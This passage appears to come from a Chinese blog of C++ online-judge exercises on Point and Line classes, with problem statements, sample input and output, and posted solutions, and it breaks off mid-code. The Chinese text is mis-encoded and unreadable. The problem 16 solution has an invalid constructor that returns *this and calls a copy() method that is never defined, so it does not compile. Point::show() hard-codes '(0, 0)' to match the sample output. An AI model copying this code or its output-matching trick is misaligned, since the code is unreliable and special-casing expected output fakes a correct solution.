<h2 id="Output-14"><a href="#Output-14" class="headerlink" title="Output"></a>Output</h2><p>ç”¨ShowPoint()å‡½æ•°æ¥è¾“å‡ºï¼ˆé€šè¿‡å‚æ•°ä¼ å…¥çš„ï¼‰Pointå¯¹è±¡çš„å€¼æˆ–åæ ‡å€¼ï¼šXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚<br> å¯¹æ¯ä¸ªPointå¯¹è±¡ï¼Œè°ƒç”¨show()æ–¹æ³•è¾“å‡ºå…¶å€¼ï¼Œè¾“å‡ºæ ¼å¼ä¸ShowPoint()å‡½æ•°ç•¥æœ‰ä¸åŒï¼šâ€œPoint[i] :â€ï¼Œiè¡¨ç¤ºè¿™æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç¬¬iä¸ªè¢«åˆ›å»ºçš„Pointå¯¹è±¡ã€‚<br> è°ƒç”¨showSumOfPoint()è¾“å‡ºPointå¯¹è±¡çš„è®¡æ•°ç»Ÿè®¡ï¼Œè¾“å‡ºæ ¼å¼è§sampleã€‚<br> Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-14"><a href="#Sample-Input-14" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-14"><a href="#Sample-Output-14" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, 2)</p>
<p>Point : (3, 3)</p>
<p>Point : (2, 1)</p>
<p>Point : (1, 1)</p>
<p>Point : (4, -3)</p>
<p>==========gorgeous separator==========</p>
<p>Point[1] : (1, 0)</p>
<p>Point[2] : (3, 3)</p>
<p>Point[3] : (0, 0)</p>
<p>Point[4] : (4, -3)</p>
<p>Point[64] : (1, 0)</p>
<p>Point[64] : (1, 0)</p>
<p>==========gorgeous separator==========</p>
<p>In total : 66 points.</p>
<h2 id="HINT-14"><a href="#HINT-14" class="headerlink" title="HINT"></a>HINT</h2><p>ä¼ é€’å’Œè¿”å›å¼•ç”¨æ˜¯ä¸æ„é€ æ–°å¯¹è±¡çš„ã€‚ç»™å‡½æ•°æ­£ç¡®çš„è¿”å›å€¼ã€‚</p>
<h2 id="Append-Code-14"><a href="#Append-Code-14" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1125&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;iomanip&gt;  
using namespace std;  
class Point  
&#123;  
private :  
    double x_,y_;  
    static int total_num;  
    int id;  
public:  
    Point()&#123; x_ = 0;y_ = 0;total_num++; id = total_num; &#125;  
    Point (double xx )  
    &#123;  
        x_ = xx;  
        y_ = xx ;  
         total_num++;  
         id = total_num;  
    &#125;  
    Point(double xx, double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
        total_num++;  
        id = total_num;  
    &#125;  
    Point(const Point &amp; pt)  
    &#123;  
        x_ = pt.x_;  
        y_ = pt.y_;  
        total_num++;  
        id = total_num;  
    &#125;  
    double x() const  
    &#123;  
        return x_;  
    &#125;  
    double y() const  
    &#123;  
        return y_;  
    &#125;  
    double x( double xx)  
    &#123;  
        return ( x_ = xx);  
    &#125;  
    double y(double yy)  
    &#123;  
        return ( y_ = yy);  
    &#125;  
    double getX() const  
    &#123;  
        return x_;  
    &#125;  
    double getY() const  
    &#123;  
        return y_;  
    &#125;  
    double setX(double xx)  
    &#123;  
        return ( x_ = xx);  
    &#125;  
    double setY(double yy)  
    &#123;  
        return (y_ = yy);  
    &#125;  
    Point &amp; setPoint(double xx,double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
        return *this;  
    &#125;  
    void show() const  
    &#123;  
          cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point[&quot;&lt;&lt;id&lt;&lt;&quot;] : (&quot;&lt;&lt; x_ &lt;&lt; &quot;, &quot; &lt;&lt; y_ &lt;&lt; &quot;)&quot; &lt;&lt;endl;  
       //cout &lt;&lt; &quot;Current : &quot; &lt;&lt;num &lt;&lt; &quot; points.&quot;  &lt;&lt;endl;  
    &#125;  
   static void showSumOfPoint()  
    &#123;  
        cout &lt;&lt; setprecision(16) &lt;&lt;&quot;In total : &quot; &lt;&lt;  total_num &lt;&lt; &quot; points.&quot;&lt;&lt;endl;  
    &#125;  
&#125;;  
int Point::total_num;  
void ShowPoint(Point p)  
&#123;  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x()&lt;&lt;&quot;, &quot;&lt;&lt;p.y()&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

void ShowPoint(double x, double y)  
&#123;  
    Point p(x, y);  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x()&lt;&lt;&quot;, &quot;&lt;&lt;p.y()&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

void ShowPoint(Point &amp;p, double x, double y)  
&#123;  
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;p.x(x)&lt;&lt;&quot;, &quot;&lt;&lt;p.x(y)&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
&#125;  

int main()  
&#123;  
    int l(0);  
    char c;  
    double a, b;  
    Point pt[60];  
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)  
    &#123;  
        if(a == b)  
            ShowPoint(pt[l].setPoint(a, b));  
        if(a &gt; b)  
            ShowPoint(a, b);  
        if(a &lt; b)  
            ShowPoint(pt[l], a, b);  
        l++;  
    &#125;  
    Point p(a), q(b);  
    ShowPoint(q);  
    double x(0), y(0);  
    for(int i = 0; i &lt; l; i++)  
        x += pt[i].getX(), y -= pt[i].getY();  
    ShowPoint(pt[l].setX(x), pt[l].setY(y));  
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;  
    for(int i = 0; i &lt;= l; i++)  
        pt[i].show();  
    q.setPoint(q.x() - p.x() + a, q.y() - p.y() + b).show();  
    q.show();  
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;  
    p.showSumOfPoint();  
&#125;  </code></pre>
<h3 id="16-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-VI"><a href="#16-å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±»-VI" class="headerlink" title="16.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (VI)"></a>16.å¹³é¢ä¸Šçš„ç‚¹â€”â€”Pointç±» (VI)</h3><blockquote>
<h2 id="Description-15"><a href="#Description-15" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»çš„æ„é€ æ–¹æ³•å’Œæ¥å£æè¿°ä¸­çš„æ–¹æ³•å’Œå‡½æ•°ã€‚</p>
<p>æ¥å£æè¿°ï¼š<br> showPoint()å‡½æ•°ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚<br> Point::show()æ–¹æ³•ï¼šæŒ‰è¾“å‡ºæ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚<br> Point::showSumOfPoint()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºç¨‹åºè¿è¡Œè‡³å½“å‰å­˜åœ¨è¿‡çš„Pointå¯¹è±¡æ€»æ•°ã€‚<br> Point::x()æ–¹æ³•ï¼šå–xåæ ‡ã€‚<br> Point::y()æ–¹æ³•ï¼šå–yåæ ‡ã€‚<br> Point::x(double)æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®xåæ ‡å¹¶è¿”å›ã€‚<br> Point::y(double)æ–¹æ³•ï¼šä¼ å‚æ•°è®¾ç½®yåæ ‡å¹¶è¿”å›ã€‚<br> Point::setPoint(double,double)æ–¹æ³•ï¼šè®¾ç½®Pointå¯¹è±¡çš„xåæ ‡ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰å’Œyåæ ‡ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰å¹¶è¿”å›æœ¬å¯¹è±¡ã€‚<br> Point::isEqual()æ–¹æ³•ï¼šåˆ¤æ–­ä¼ å…¥çš„å‚æ•°ä¸å¯¹è±¡çš„åæ ‡æ˜¯å¦ç›¸åŒï¼Œç›¸åŒè¿”å›trueã€‚<br> Point::copy()æ–¹æ³•ï¼šä¼ å‚æ•°å¤åˆ¶ç»™å¯¹è±¡ã€‚<br> Point::inverse()æ–¹æ³•ï¼Œæœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼šä¸ä¼ å‚æ•°åˆ™å°†å¯¹è±¡è‡ªèº«çš„xåæ ‡å’Œyåæ ‡äº’æ¢ï¼›è‹¥å°†Pointå¯¹è±¡åšå‚æ•°ä¼ å…¥ï¼Œåˆ™å°†ä¼ å…¥å¯¹è±¡çš„åæ ‡äº¤æ¢å¤åˆ¶ç»™å¯¹è±¡è‡ªèº«ï¼Œä¸ä¿®æ”¹å‚æ•°çš„å€¼ã€‚</p>
<h2 id="Input-15"><a href="#Input-15" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥å¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„åæ ‡â€œx,yâ€ï¼Œè¡¨ç¤ºç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-15"><a href="#Output-15" class="headerlink" title="Output"></a>Output</h2><p>ç”¨ShowPoint()å‡½æ•°æ¥è¾“å‡ºï¼ˆé€šè¿‡å‚æ•°ä¼ å…¥çš„ï¼‰Pointå¯¹è±¡çš„å€¼æˆ–åæ ‡å€¼ï¼šXåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ã€‚æ¯ä¸ªåæ ‡çš„è¾“å‡ºç²¾åº¦ä¸ºæœ€é•¿16ä½ã€‚<br>å¯¹æ¯ä¸ªPointå¯¹è±¡ï¼Œè°ƒç”¨show()æ–¹æ³•è¾“å‡ºå…¶å€¼ï¼Œè¾“å‡ºæ ¼å¼ä¸ShowPoint()å‡½æ•°ç•¥æœ‰ä¸åŒï¼šâ€œPoint[i] :â€ï¼Œiè¡¨ç¤ºè¿™æ˜¯ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç¬¬iä¸ªè¢«åˆ›å»ºçš„Pointå¯¹è±¡ã€‚<br>è°ƒç”¨showSumOfPoint()è¾“å‡ºPointå¯¹è±¡çš„è®¡æ•°ç»Ÿè®¡ï¼Œè¾“å‡ºæ ¼å¼è§sampleã€‚<br>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-15"><a href="#Sample-Input-15" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1,2</p>
<p>3,3</p>
<p>2,1</p>
<h2 id="Sample-Output-15"><a href="#Sample-Output-15" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point[3] : (1, 2)</p>
<p>Point[1] : (2, 1)</p>
<p>Point[4] : (3, 3)</p>
<p>Point[1] : (3, 3)</p>
<p>Point[5] : (1, 2)</p>
<p>Point[1] : (1, 2)</p>
<p>Point[2] : (0, 0)</p>
<p>==========gorgeous separator==========</p>
<p>Point[2] : (-7, 5)</p>
<p>Point[3] : (1, 2)</p>
<p>Point[4] : (3, 3)</p>
<p>Point[5] : (1, 2)</p>
<p>Point[6] : (-7, 5)</p>
<p>==========gorgeous separator==========</p>
<p>Point[63] : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>Point : (3, 3)</p>
<p>In total : 64 points.</p>
<h2 id="HINT-15"><a href="#HINT-15" class="headerlink" title="HINT"></a>HINT</h2><p>ç»™å‡½æ•°æ­£ç¡®çš„è¿”å›å€¼ã€‚æ³¨æ„å¸¸é‡å¯¹è±¡è°ƒç”¨çš„å‡½æ•°ã€‚</p>
<h2 id="Append-Code-15"><a href="#Append-Code-15" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1126&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point
&#123;

    double m,n;
    int count;
    static int sum;
public :

    friend void ShowPoint(Point);
    friend void ShowPoint(double, double);

    void show()const
    &#123;
        cout&lt;&lt;setprecision(16)&lt;&lt;&quot;Point[&quot;&lt;&lt;count&lt;&lt;&quot;] : (&quot;&lt;&lt;m&lt;&lt;&quot;, &quot;&lt;&lt;n&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    double x(double a)
    &#123;
        m = a;
        return a;

    &#125;
    double y(double b)
    &#123;
        n = b;
        return b;
    &#125;
    double x()const
    &#123;
        return m;
    &#125;
    double y()const
    &#123;

        return n;
    &#125;
    Point  &amp;setPoint(double a,double b)
    &#123;
        m=a;
        n=b;
        return *this;
    &#125;void showSumOfPoint()const
    &#123;
        cout &lt;&lt; &quot;In total : &quot; &lt;&lt;sum &lt;&lt; &quot; points.&quot; &lt;&lt; endl;
    &#125;
    Point(double a,double b)
    &#123;

        m = a;
        n = b;
        sum++;
        count =sum;
    &#125;
    Point():m(0),n(0)
    &#123;
        sum++;
        count =sum;
    &#125;
    Point (Point p)
    &#123;
        setPoint(p.getx(),p.gety());
        return *this;
    &#125;
    Point&amp; inverse()
    &#123;
        double temp=m;
        m=n;
        n=temp;
        return *this;
    &#125;
    Point&amp; inverse(Point p)
    &#123;

        m=p.n;
        n=p.m;
        return *this;
    &#125;
    double getx()
    &#123;
     return this-&gt;m;
    &#125;
    double gety()
    &#123;
     return this-&gt;n;
    &#125;

    bool isEqual(const Point &amp;p)const
    &#123;
        if(p.m == m &amp;&amp; p.n == n)
            return true;
        return false;
    &#125;

&#125;;
void ShowPoint(Point p)
&#123;
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt; p.x() &lt;&lt;&quot;, &quot;&lt;&lt; p.y() &lt;&lt;&quot;)&quot;&lt;&lt;endl;
&#125;
void ShowPoint(double a,double b)
&#123;
    cout&lt;&lt;std::setprecision(16)&lt;&lt;&quot;Point : (&quot;&lt;&lt;a&lt;&lt;&quot;, &quot;&lt;&lt;b&lt;&lt;&quot;)&quot;&lt;&lt;endl;
&#125;
int Point::sum = 0;
int main()
&#123;
    int l(0);
    char c;
    double a, b;
    Point p, q, pt[60];
    while(std::cin&gt;&gt;a&gt;&gt;c&gt;&gt;b)
    &#123;
        if(a == b)
            p.copy(pt[l].setPoint(a, b));
        if(a &gt; b)
            p.copy(pt[l].setPoint(a, b).inverse());
        if(a &lt; b)
            p.inverse(pt[l].setPoint(a, b));
        if(a &lt; 0)
            q.copy(p).inverse();
        if(b &lt; 0)
            q.inverse(p).copy(pt[l]);
        pt[l++].show();
        p.show();
    &#125;
    q.show();
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;
    double x(0), y(0);
    for(int i = 0; i &lt; l; i++)
        x += pt[i].x(), y -= pt[i].y();
    pt[l].x(y), pt[l].y(x);
    q.copy(pt[l]).show();
    for(int i = 0; i &lt;= l; i++)
        pt[i].show();
    cout&lt;&lt;&quot;==========gorgeous separator==========&quot;&lt;&lt;endl;
    const Point const_point(3, 3);
    const_point.show();
    for(int i = 0; i &lt;= l; i++)
    &#123;
        if(const_point.isEqual(pt[i]))
        &#123;
            ShowPoint(const_point);
            ShowPoint(const_point.x(), const_point.y());
            ShowPoint(Point(const_point.x(), const_point.y()));
        &#125;
    &#125;
    const_point.showSumOfPoint();
&#125;</code></pre>
<h3 id="17-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-I"><a href="#17-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-I" class="headerlink" title="17.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (I)"></a>17.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (I)</h3><blockquote>
<h2 id="Description-16"><a href="#Description-16" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<h2 id="Input-16"><a href="#Input-16" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚</p>
<p>æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-16"><a href="#Output-16" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-16"><a href="#Sample-Input-16" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-16"><a href="#Sample-Output-16" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0)</p>
<p>Line : (0, 0) to (1, 1)</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (2, 3) to (4, 5)</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<h2 id="HINT-16"><a href="#HINT-16" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-16"><a href="#Append-Code-16" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1327&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point p,Point q):p1(p),p2(q)&#123;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;

/////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;
</code></pre>
<blockquote>
<p><a href="http://www.cnblogs.com/BeyondAnyTime/archive/2012/06/04/2535305.html">å…³äºC++ä¸­çš„å‹å…ƒå‡½æ•°çš„æ€»ç»“</a></p>
</blockquote>
<h3 id="18-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-II"><a href="#18-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-II" class="headerlink" title="18.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (II)"></a>18.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (II)</h3><blockquote>
<h2 id="Description-17"><a href="#Description-17" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<h2 id="Input-17"><a href="#Input-17" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-17"><a href="#Output-17" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-17"><a href="#Sample-Input-17" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-17"><a href="#Sample-Output-17" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (0, 0)Line : (0, 0) to (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1)Line : (0, 0) to (1, 1) is erased.</p>
<p>Line : (1, 1) to (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (1, 1) to (2, 3) is erased.</p>
<p>Line : (2, 3) to (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5)Line : (2, 3) to (4, 5) is erased.</p>
<p>Line : (0, 1) to (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (0, 1) to (1, 0) is erased.</p>
<p>Line : (1, -2) to (2, -1) is created.</p>
<p>Line : (1, -2) to (0, 0) is created.</p>
<p>Line : (2, -1) to (0, 0) is created.</p>
<p>Line : (0, 0) to (2, -1) is created.</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<p>Line : (0, 0) to (2, -1) is erased.</p>
<p>Line : (2, -1) to (0, 0) is erased.</p>
<p>Line : (1, -2) to (0, 0) is erased.</p>
<p>Line : (1, -2) to (2, -1) is erased.</p>
<h2 id="HINT-17"><a href="#HINT-17" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-17"><a href="#Append-Code-17" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1328&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123;&#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point p,Point q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;

/////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
